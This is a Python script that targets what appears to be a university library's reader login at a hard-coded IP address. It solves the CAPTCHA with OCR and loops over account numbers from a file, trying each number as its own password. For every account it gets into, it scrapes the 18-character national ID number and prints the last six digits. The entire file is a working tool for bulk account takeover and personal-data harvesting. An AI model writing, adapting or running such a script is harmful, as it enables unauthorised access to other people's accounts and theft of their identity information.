# -*- coding: utf-8 -*-
import re
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import random
from PIL import Image
import pytesseract
pytesseract.pytesseract.tesseract_cmd = 'D:/电脑软件/tesseract-ocr/install/Tesseract-OCR/tesseract'


def Identify_Code():
    url_Picture="http://202.119.228.6:8080/reader/captcha.php"
    cookie=http.cookiejar.CookieJar()
    handler=urllib.request.HTTPCookieProcessor(cookie)
    global opener
    opener=urllib.request.build_opener(handler)
    picture=opener.open(url_Picture).read()
    local=open('C:/Users/john/Desktop/validCode-master/1.jpg','wb')
    local.write(picture)
    local.close()

    im = Image.open('1.jpg')  
    textcode =pytesseract.image_to_string(im)  
    return textcode 

def login(Ident_code,ID,PW):
    url_login="http://202.119.228.6:8080/reader/redr_verify.php"
    url_Certificate="http://202.119.228.6:8080/reader/redr_info_rule.php"
    #需要post的数据
    login_data = {
           'number': ID,
           'passwd': PW,
           'captcha': Ident_code,
           'select': 'cert_no',
           'returnUrl':"",
           }
    login_data=urllib.parse.urlencode(login_data).encode('utf-8')
    #自定义一个请求
    req=urllib.request.Request(url=url_login,data=login_data)
    #访问登录界面
    result=opener.open(req)
    #访问证件信息源码
    res=opener.open( url_Certificate)
    return res.read().decode('utf-8')

def search(html):
    #reg=r"([1-9]\d{5}[1-9]\d{3}((0[1-9])|(1[0-2]))(3[0-1]|0[1-9]|[1-2]\d)\d{3}([0-9]|X))"
    reg=r"(\d{18}|\d{17}X)"    
    imgre=re.compile(reg)
    imglist=re.findall(imgre,html)
    Str="".join(list(imglist))
    return Str[-6:]



if __name__=="__main__":
    f=open("C:\\Users\\john\\Desktop\\validCode-master\\s.txt","r")
    lines=f.readlines()#读取全部内容
    for line in lines:
        ID=line[0:9]
        PW=line[0:9]
        for i in range(5):
            x=Identify_Code()
            Str=search(login(x,ID,PW))
            if Str:
                print(Str)
                break
        












